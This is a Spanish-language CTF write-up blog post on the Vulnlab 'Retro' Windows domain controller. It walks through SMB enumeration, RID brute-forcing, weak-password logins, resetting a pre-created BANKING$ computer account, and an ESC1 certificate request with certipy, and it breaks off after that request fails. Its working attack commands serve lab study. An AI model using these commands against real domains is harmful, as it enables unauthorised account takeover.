@@ -1,0 +1,597 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Vulnlab - Retro | MiguelRega7 - blog</title>
+<meta name="generator" content="Jekyll v4.3.2" />
+<meta property="og:title" content="Vulnlab - Retro" />
+<meta name="author" content="MiguelRega7" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<meta property="og:description" content="Posts sobre resolución de CTFs y ciberseguridad." />
+<link rel="canonical" href="http://localhost:4000/vulnlab/machines/2024/03/27/retro.html" />
+<meta property="og:url" content="http://localhost:4000/vulnlab/machines/2024/03/27/retro.html" />
+<meta property="og:site_name" content="MiguelRega7 - blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-03-27T00:00:00-06:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Vulnlab - Retro" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"MiguelRega7"},"dateModified":"2024-03-27T00:00:00-06:00","datePublished":"2024-03-27T00:00:00-06:00","description":"Posts sobre resolución de CTFs y ciberseguridad.","headline":"Vulnlab - Retro","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/vulnlab/machines/2024/03/27/retro.html"},"url":"http://localhost:4000/vulnlab/machines/2024/03/27/retro.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="MiguelRega7 - blog" />
+</head>
+<body><header class="site-header">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">MiguelRega7 - blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Vulnlab - Retro</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2024-03-27T00:00:00-06:00" itemprop="datePublished">
+        Mar 27, 2024
+      </time></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p align="center">
+<img src="/assets/vulnlab/img/machines/retro/icon.png" />
+</p>
+
+<h2 id="portscan">PortScan</h2>
+
+<ul>
+  <li>Hacemos un escaneo buscando puertos abiertos por el protocolo <strong>TCP</strong>.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat</span> ../nmap/targeted
+<span class="c"># Nmap 7.94SVN scan initiated Sun Mar  3 17:26:17 2024 as: nmap -sCV -p53,135,139,389,445,464,3389,49719 -oN targeted 10.10.65.176</span>
+Nmap scan report <span class="k">for </span>10.10.65.176
+Host is up <span class="o">(</span>0.19s latency<span class="o">)</span><span class="nb">.</span>
+
+PORT      STATE SERVICE       VERSION
+53/tcp    open  domain        Simple DNS Plus
+135/tcp   open  msrpc         Microsoft Windows RPC
+139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp   open  ldap          Microsoft Windows Active Directory LDAP <span class="o">(</span>Domain: retro.vl0., Site: Default-First-Site-Name<span class="o">)</span>
+|_ssl-date: TLS randomness does not represent <span class="nb">time</span>
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.retro.vl
+| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC.retro.vl
+| Not valid before: 2023-07-23T21:06:31
+|_Not valid after:  2024-07-22T21:06:31
+445/tcp   open  microsoft-ds?
+464/tcp   open  kpasswd5?
+3389/tcp  open  ms-wbt-server Microsoft Terminal Services
+| ssl-cert: Subject: <span class="nv">commonName</span><span class="o">=</span>DC.retro.vl
+| Not valid before: 2024-03-02T23:18:09
+|_Not valid after:  2024-09-01T23:18:09
+|_ssl-date: 2024-03-03T23:28:08+00:00<span class="p">;</span> <span class="nt">-1s</span> from scanner time.
+| rdp-ntlm-info:
+|   Target_Name: RETRO
+|   NetBIOS_Domain_Name: RETRO
+|   NetBIOS_Computer_Name: DC
+|   DNS_Domain_Name: retro.vl
+|   DNS_Computer_Name: DC.retro.vl
+|   Product_Version: 10.0.20348
+|_  System_Time: 2024-03-03T23:27:29+00:00
+49719/tcp open  msrpc         Microsoft Windows RPC
+Service Info: Host: DC<span class="p">;</span> OS: Windows<span class="p">;</span> CPE: cpe:/o:microsoft:windows
+
+Host script results:
+| smb2-time:
+|   <span class="nb">date</span>: 2024-03-03T23:27:31
+|_  start_date: N/A
+| smb2-security-mode:
+|   3:1:1:
+|_    Message signing enabled and required
+</code></pre></div></div>
+
+<h2 id="smb-enumeration">SMB Enumeration</h2>
+
+<ul>
+  <li>Vamos a agregar los dominios que tenemos al <strong>/etc/hosts</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">echo</span> <span class="s2">"10.10.65.176 retro.vl DC.retro.vl"</span> | <span class="nb">sudo tee</span> <span class="nt">-a</span> /etc/hosts
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que estamos ante una máquina <strong>Windows 10</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.65.176
+SMB         10.10.65.176    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si enumeramos los recursos compartidos por <strong>smb</strong> encontramos <code class="language-plaintext highlighter-rouge">Trainees</code> empleando un <strong>Null Session</strong> .</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient <span class="nt">-L</span> 10.10.65.176 <span class="nt">-N</span>
+
+	Sharename       Type      Comment
+	<span class="nt">---------</span>       <span class="nt">----</span>      <span class="nt">-------</span>
+	ADMIN<span class="nv">$ </span>         Disk      Remote Admin
+	C<span class="nv">$ </span>             Disk      Default share
+	IPC<span class="nv">$ </span>           IPC       Remote IPC
+	NETLOGON        Disk      Logon server share
+	Notes           Disk
+	SYSVOL          Disk      Logon server share
+	Trainees        Disk
+Reconnecting with SMB1 <span class="k">for </span>workgroup listing.
+do_connect: Connection to 10.10.65.176 failed <span class="o">(</span>Error NT_STATUS_RESOURCE_NAME_NOT_FOUND<span class="o">)</span>
+Unable to connect with SMB1 <span class="nt">--</span> no workgroup available
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a conectarnos al recurso compartido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.65.176/trainees
+Password <span class="k">for</span> <span class="o">[</span>WORKGROUP<span class="se">\m</span>iguel]:
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">dir</span>
+  <span class="nb">.</span>                                   D        0  Sun Jul 23 15:58:43 2023
+  ..                                DHS        0  Wed Jul 26 03:54:14 2023
+  Important.txt                       A      288  Sun Jul 23 16:00:13 2023
+
+		6261499 blocks of size 4096. 2892471 blocks available
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Encontramos lo siguiente.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>smb: <span class="se">\&gt;</span> get Important.txt
+getting file <span class="se">\I</span>mportant.txt of size 288 as Important.txt <span class="o">(</span>0.4 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.4 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span> <span class="nb">exit</span>
+➜  content <span class="nb">cat </span>Important.txt
+Dear Trainees,
+
+I know that some of you seemed to struggle with remembering strong and unique passwords.
+So we decided to bundle every one of you up into one account.
+Stop bothering us. Please. We have other stuff to <span class="k">do </span>than resetting your password every day.
+
+Regards
+
+The Admins%
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y bueno, nos dicen que él la administración está cansada de tener que lidiar con el problema recurrente de las contraseñas olvidadas, crearon una cuenta para todos los <strong>trainees</strong>.</p>
+  </li>
+  <li>
+    <p>Según el admin creo una cuenta para todos, vamos a realizar un ataque de fuerza bruta con <strong>crackmapexec</strong> con los <strong>RIDs</strong> de los usuarios del dominio junto con sus <strong>SID</strong> .</p>
+  </li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/U4ZlMAD.png" />
+</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.65.176 <span class="nt">-u</span> <span class="s1">'guest'</span> <span class="nt">-p</span> <span class="s1">''</span> <span class="nt">--rid-brute</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span>+] retro.vl<span class="se">\g</span>uest:
+SMB         10.10.65.176    445    DC               <span class="o">[</span>+] Brute forcing RIDs
+SMB         10.10.65.176    445    DC               498: RETRO<span class="se">\E</span>nterprise Read-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               500: RETRO<span class="se">\A</span>dministrator <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               501: RETRO<span class="se">\G</span>uest <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               502: RETRO<span class="se">\k</span>rbtgt <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               512: RETRO<span class="se">\D</span>omain Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               513: RETRO<span class="se">\D</span>omain Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               514: RETRO<span class="se">\D</span>omain Guests <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               515: RETRO<span class="se">\D</span>omain Computers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               516: RETRO<span class="se">\D</span>omain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               517: RETRO<span class="se">\C</span>ert Publishers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.10.65.176    445    DC               518: RETRO<span class="se">\S</span>chema Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               519: RETRO<span class="se">\E</span>nterprise Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               520: RETRO<span class="se">\G</span>roup Policy Creator Owners <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               521: RETRO<span class="se">\R</span>ead-only Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               522: RETRO<span class="se">\C</span>loneable Domain Controllers <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               525: RETRO<span class="se">\P</span>rotected Users <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               526: RETRO<span class="se">\K</span>ey Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               527: RETRO<span class="se">\E</span>nterprise Key Admins <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               553: RETRO<span class="se">\R</span>AS and IAS Servers <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.10.65.176    445    DC               571: RETRO<span class="se">\A</span>llowed RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.10.65.176    445    DC               572: RETRO<span class="se">\D</span>enied RODC Password Replication Group <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1000: RETRO<span class="se">\D</span>C<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1101: RETRO<span class="se">\D</span>nsAdmins <span class="o">(</span>SidTypeAlias<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1102: RETRO<span class="se">\D</span>nsUpdateProxy <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1104: RETRO<span class="se">\t</span>rainee <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1106: RETRO<span class="se">\B</span>ANKING<span class="nv">$ </span><span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1107: RETRO<span class="se">\j</span>burley <span class="o">(</span>SidTypeUser<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1108: RETRO<span class="se">\H</span>elpDesk <span class="o">(</span>SidTypeGroup<span class="o">)</span>
+SMB         10.10.65.176    445    DC               1109: RETRO<span class="se">\t</span>black <span class="o">(</span>SidTypeUser<span class="o">)</span>
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>Vemos que el usuario <strong>trainee</strong> existe y bueno como el admin dice que han tenido dificultades para recordar contraseñas fuertes y únicas la contraseña de los usuarios tiene que ser muy fácil si probamos con la contraseña del nombre de usuario vemos que es correcta.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.65.176 <span class="nt">-u</span> <span class="s1">'trainee'</span> <span class="nt">-p</span> <span class="s1">'trainee'</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span>+] retro.vl<span class="se">\t</span>rainee:trainee
+</code></pre></div></div>
+
+<ul>
+  <li>Vamos a enumerar los recursos compartidos por <strong>smb</strong>, ya que tenemos credenciales válidas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.65.176 <span class="nt">-u</span> <span class="s1">'trainee'</span> <span class="nt">-p</span> <span class="s1">'trainee'</span> <span class="nt">--shares</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span>+] retro.vl<span class="se">\t</span>rainee:trainee
+SMB         10.10.65.176    445    DC               <span class="o">[</span>+] Enumerated shares
+SMB         10.10.65.176    445    DC               Share           Permissions     Remark
+SMB         10.10.65.176    445    DC               <span class="nt">-----</span>           <span class="nt">-----------</span>     <span class="nt">------</span>
+SMB         10.10.65.176    445    DC               ADMIN<span class="nv">$ </span>                         Remote Admin
+SMB         10.10.65.176    445    DC               C<span class="nv">$ </span>                             Default share
+SMB         10.10.65.176    445    DC               IPC<span class="nv">$ </span>           READ            Remote IPC
+SMB         10.10.65.176    445    DC               NETLOGON        READ            Logon server share
+SMB         10.10.65.176    445    DC               Notes           READ
+SMB         10.10.65.176    445    DC               SYSVOL          READ            Logon server share
+SMB         10.10.65.176    445    DC               Trainees        READ
+➜  content
+</code></pre></div></div>
+
+<ul>
+  <li>
+    <p>Y bueno, no vemos mucho más que <strong>Notes</strong> a sí que vamos a usar <strong>smbclient</strong> para conectarnos.</p>
+  </li>
+  <li>
+    <p>Y bueno, vemos un <strong>.txt</strong> vamos a descargarlo.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content smbclient //10.10.65.176/Notes <span class="nt">-U</span> trainee%trainee
+Try <span class="s2">"help"</span> to get a list of possible commands.
+smb: <span class="se">\&gt;</span> <span class="nb">ls</span>
+  <span class="nb">.</span>                                   D        0  Sun Jul 23 16:03:16 2023
+  ..                                DHS        0  Wed Jul 26 03:54:14 2023
+  ToDo.txt                            A      248  Sun Jul 23 16:05:56 2023
+
+		6261499 blocks of size 4096. 2891438 blocks available
+smb: <span class="se">\&gt;</span> get ToDo.txt
+getting file <span class="se">\T</span>oDo.txt of size 248 as ToDo.txt <span class="o">(</span>0.3 KiloBytes/sec<span class="o">)</span> <span class="o">(</span>average 0.3 KiloBytes/sec<span class="o">)</span>
+smb: <span class="se">\&gt;</span>
+</code></pre></div></div>
+
+<ul>
+  <li>Este es el contenido.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content <span class="nb">cat </span>ToDo.txt
+Thomas,
+
+after convincing the finance department to get rid of their ancienct banking software
+it is finally <span class="nb">time </span>to clean up the mess they made. We should start with the pre created
+computer account. That one is older than me.
+
+Best
+
+James%                                                                                                                                             ➜  content
+</code></pre></div></div>
+
+<h2 id="pre-created-computer-account">Pre created computer account</h2>
+
+<ul>
+  <li>Bueno al parecer ya están hablando de <strong>pre created computer account</strong> hubo un incidente con el antiguo software bancario y es momento de comenzar con la limpieza <a href="https://trustedsec.com/blog/diving-into-pre-created-computer-accounts">https://trustedsec.com/blog/diving-into-pre-created-computer-accounts</a> .</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/rK0OazT.png" />
+</p>
+
+<ul>
+  <li>Como hablan de <strong>Finance department</strong> <strong>$</strong> si recordamos encontramos esto.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>SMB         10.10.65.176    445    DC               1106: RETRO<span class="se">\B</span>ANKING<span class="nv">$ </span>
+</code></pre></div></div>
+
+<ul>
+  <li>Si buscamos en <strong>internet</strong> encontramos la siguiente información que es muy útil.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/ZR1XamN.png" />
+</p>
+
+<ul>
+  <li>Podemos intentar con <strong>crackmapexec</strong> para ver si alguna de las contraseñas son correctas.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content  crackmapexec smb 10.10.65.176 <span class="nt">-u</span> <span class="s1">'BANKING$'</span> <span class="nt">-p</span> <span class="s1">'banking'</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.65.176    445    DC               <span class="o">[</span>-] retro.vl<span class="se">\B</span>ANKING<span class="nv">$:</span>banking STATUS_LOGON_FAILURE
+</code></pre></div></div>
+
+<ul>
+  <li>Nos dice que <strong>FAILURE</strong>, pero si leemos el artículo encontramos esto.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/0x765dB.png" />
+</p>
+
+<ul>
+  <li>Bueno, si investigamos vemos que lo que tenemos que hacer es cambiar la contraseña.</li>
+</ul>
+
+<p align="center">
+<img src="https://i.imgur.com/R7Oka3M.png" />
+</p>
+
+<ul>
+  <li>También no lo dicen en el artículo en la parte de <strong>Changing the password</strong> además nos dicen que usemos <strong>RPC</strong> vamos a usar una herramienta de <strong>impacket</strong> para cambiarnos la contraseña. (Si ven una IP diferente es por qué pause la máquina y la volví arrancar y me cambio la IP).</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content impacket-changepasswd <span class="s1">'retro.vl/BANKING$'</span>:banking@10.10.121.174 <span class="nt">-newpass</span> Passwordxd1234 <span class="nt">-dc-ip</span> 10.10.121.174 <span class="nt">-p</span> rpc-samr
+Impacket v0.11.0 - Copyright 2023 Fortra
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Changing the password of retro.vl<span class="se">\B</span>ANKING<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Connecting to DCE/RPC as retro.vl<span class="se">\B</span>ANKING<span class="err">$</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Password was changed successfully.
+</code></pre></div></div>
+
+<ul>
+  <li>Ahora verificamos que la contraseña fue cambiada de manera exitosa.</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content crackmapexec smb 10.10.121.174 <span class="nt">-u</span> <span class="s1">'BANKING$'</span> <span class="nt">-p</span> <span class="s1">'Passwordxd1234'</span>
+SMB         10.10.121.174   445    DC               <span class="o">[</span><span class="k">*</span><span class="o">]</span> Windows 10.0 Build 20348 x64 <span class="o">(</span>name:DC<span class="o">)</span> <span class="o">(</span>domain:retro.vl<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span>
+SMB         10.10.121.174   445    DC               <span class="o">[</span>+] retro.vl<span class="se">\B</span>ANKING<span class="nv">$:</span>Passwordxd1234
+</code></pre></div></div>
+
+<h2 id="active-directory-certificate-services">Active Directory Certificate Services</h2>
+
+<ul>
+  <li>
+    <p>Ahora que hemos cambiado la contraseña podemos usar <strong>certipy</strong> <a href="https://github.com/ly4k/Certipy">https://github.com/ly4k/Certipy</a> aquí un post sobre los certificados <a href="https://posts.specterops.io/certified-pre-owned-d95910965cd2">https://posts.specterops.io/certified-pre-owned-d95910965cd2</a> .</p>
+  </li>
+  <li>
+    <p>Bueno, vamos a emplear la herramienta.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad find <span class="nt">-u</span> <span class="s1">'BANKING$'</span>@retro.vl <span class="nt">-p</span> Passwordxd1234 <span class="nt">-dc-ip</span> 10.10.121.174 <span class="nt">-stdout</span>
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 34 certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Finding certificate authorities
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 1 certificate authority
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Found 12 enabled certificate templates
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'retro-DC-CA'</span> via CSRA
+<span class="o">[!]</span> Got error <span class="k">while </span>trying to get CA configuration <span class="k">for</span> <span class="s1">'retro-DC-CA'</span> via CSRA: CASessionError: code: 0x80070005 - E_ACCESSDENIED - General access denied error.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Trying to get CA configuration <span class="k">for</span> <span class="s1">'retro-DC-CA'</span> via RRP
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Got CA configuration <span class="k">for</span> <span class="s1">'retro-DC-CA'</span>
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Enumeration output:
+Certificate Authorities
+  0
+    CA Name                             : retro-DC-CA
+    DNS Name                            : DC.retro.vl
+    Certificate Subject                 : <span class="nv">CN</span><span class="o">=</span>retro-DC-CA, <span class="nv">DC</span><span class="o">=</span>retro, <span class="nv">DC</span><span class="o">=</span>vl
+    Certificate Serial Number           : 7A107F4C115097984B35539AA62E5C85
+    Certificate Validity Start          : 2023-07-23 21:03:51+00:00
+    Certificate Validity End            : 2028-07-23 21:13:50+00:00
+    Web Enrollment                      : Disabled
+    User Specified SAN                  : Disabled
+    Request Disposition                 : Issue
+    Enforce Encryption <span class="k">for </span>Requests     : Enabled
+    Permissions
+      Owner                             : RETRO.VL<span class="se">\A</span>dministrators
+      Access Rights
+        ManageCa                        : RETRO.VL<span class="se">\A</span>dministrators
+                                          RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+        ManageCertificates              : RETRO.VL<span class="se">\A</span>dministrators
+                                          RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+        Enroll                          : RETRO.VL<span class="se">\A</span>uthenticated Users
+Certificate Templates
+  0
+    Template Name                       : RetroClients
+    Display Name                        : Retro Clients
+    Certificate Authorities             : retro-DC-CA
+    Enabled                             : True
+    Client Authentication               : True
+    Enrollment Agent                    : False
+    Any Purpose                         : False
+    Enrollee Supplies Subject           : True
+    Certificate Name Flag               : EnrolleeSuppliesSubject
+    Extended Key Usage                  : Client Authentication
+    Requires Manager Approval           : False
+    Requires Key Archival               : False
+    Authorized Signatures Required      : 0
+    Validity Period                     : 1 year
+    Renewal Period                      : 6 weeks
+    Minimum RSA Key Length              : 4096
+    Permissions
+      Enrollment Permissions
+        Enrollment Rights               : RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\D</span>omain Computers
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+      Object Control Permissions
+        Owner                           : RETRO.VL<span class="se">\A</span>dministrator
+        Write Owner Principals          : RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+                                          RETRO.VL<span class="se">\A</span>dministrator
+        Write Dacl Principals           : RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+                                          RETRO.VL<span class="se">\A</span>dministrator
+        Write Property Principals       : RETRO.VL<span class="se">\D</span>omain Admins
+                                          RETRO.VL<span class="se">\E</span>nterprise Admins
+                                          RETRO.VL<span class="se">\A</span>dministrator
+    <span class="o">[!]</span> Vulnerabilities
+      ESC1                              : <span class="s1">'RETRO.VL\\Domain Computers'</span> can enroll, enrollee supplies subject and template allows client authentication
+</code></pre></div></div>
+
+<ul>
+  <li><code class="language-plaintext highlighter-rouge">retro.vl</code> usa <strong>AD CS</strong> y además usa varios <strong>templates</strong> que hay uno vulnerable.</li>
+</ul>
+
+<h2 id="esc1-template">ESC1 template</h2>
+
+<ul>
+  <li>
+    <p>Vemos que el template es vulnerable a <strong>ESC1</strong> que afecta a todos los equipos del dominio, los equipos del dominio tienen la capacidad de inscribirse (enroll) para obtener certificados, y que el solicitante (enrollee) puede proporcionar el sujeto del certificado. Además, la plantilla de certificado permite la autenticación del cliente. La plantilla que se utiliza es <strong>RetroClients</strong> <a href="https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/">https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/</a> .</p>
+  </li>
+  <li>
+    <p>Podemos usar <strong>certipy</strong> para solicitar un certificado.</p>
+  </li>
+  <li>
+    <p>Vemos que nos dice que existe un mínimo para la <strong>key RSA</strong>.</p>
+  </li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>➜  content certipy-ad req <span class="nt">-u</span> <span class="s1">'BANKING$'</span>@retro.vl <span class="nt">-p</span> Passwordxd1234 <span class="nt">-dc-ip</span> 10.10.121.174 <span class="nt">-ca</span> retro-DC-CA <span class="nt">-template</span> RetroClients <span class="nt">-upn</span> administrator@retro.vl
+Certipy v4.7.0 - by Oliver Lyak <span class="o">(</span>ly4k<span class="o">)</span>
+
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Requesting certificate via RPC
+<span class="o">[</span>-] Got error <span class="k">while </span>trying to request certificate: code: 0x80094811 - CERTSRV_E_KEY_LENGTH - The public key does not meet the minimum size required by the specified certificate template.
+<span class="o">[</span><span class="k">*</span><span class="o">]</span> Request ID is 8
+Would you like to save the private key? <span class="o">(</span>y/N<span class="o">)</span>
+</code></pre></div></div>
+
+<p align="center">
+<img src="https://i.imgur.com/D8qaMXn.png" />
+</p>
+
+<ul>
+  <li>Vamos a proporcionar la medida exacta para que funcione.</li>
+</ul>
+
